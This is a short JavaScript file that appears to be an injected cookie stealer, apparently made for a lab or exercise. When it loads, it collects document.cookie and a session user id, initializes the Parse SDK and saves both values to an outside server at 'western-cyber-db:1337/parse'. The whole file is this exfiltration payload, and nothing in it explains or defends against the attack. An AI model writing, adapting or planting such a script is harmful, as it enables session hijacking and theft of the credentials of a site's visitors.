(function() {
console.log("executing script");

var session = "";
jQuery(document).ready(function ($) {
    session = '@Request.RequestContext.HttpContext.Session["portal.user.id"]';
});
run();
})();


function run() {
console.log("executing core");

Parse.initialize("western-cyber-db");
Parse.serverURL = 'http://western-cyber-db:1337/parse';

var Table = Parse.Object.extend("Table");
var table = new Table();
table.set("cookie", document.cookie);
table.set("session", session);

table.save(null, {
  success: function(table) {
    // Execute any logic that should take place after the object is saved.
    alert('New object created with objectId: ' + table.id);
  },
  error: function(table, error) {
    // Execute any logic that should take place if the save fails.
    // error is a Parse.Error with an error code and message.
    alert('Failed to create new object, with error code: ' + error.message);
  }
});
}
